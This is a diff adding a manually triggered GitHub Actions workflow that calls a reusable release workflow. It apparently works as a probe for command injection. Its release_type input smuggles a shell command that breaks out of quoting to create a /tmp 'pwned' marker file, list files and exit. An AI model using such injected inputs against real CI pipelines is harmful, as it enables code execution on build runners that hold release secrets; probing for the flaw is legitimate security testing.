@@ -1,0 +1,18 @@
+name: argus-call-25
+on:
+  workflow_dispatch:
+jobs:
+  call:
+    uses: ./.github/workflows/aiter-release.yaml
+    with:
+      release_type: "x\"; touch /tmp/pwned_RELEASE_TYPE; ls; exit 1; #"
+      docker_image_py310: "x"
+      docker_image_py312: "x"
+      build_py310: "true"
+      build_py312: "true"
+      gpu_archs: "gfx942;gfx950"
+      runner: "build-only-aiter"
+      add_date_stamp: "false"
+      use_manylinux: "false"
+      torch_pin: ""
+      torch_index_url: ""
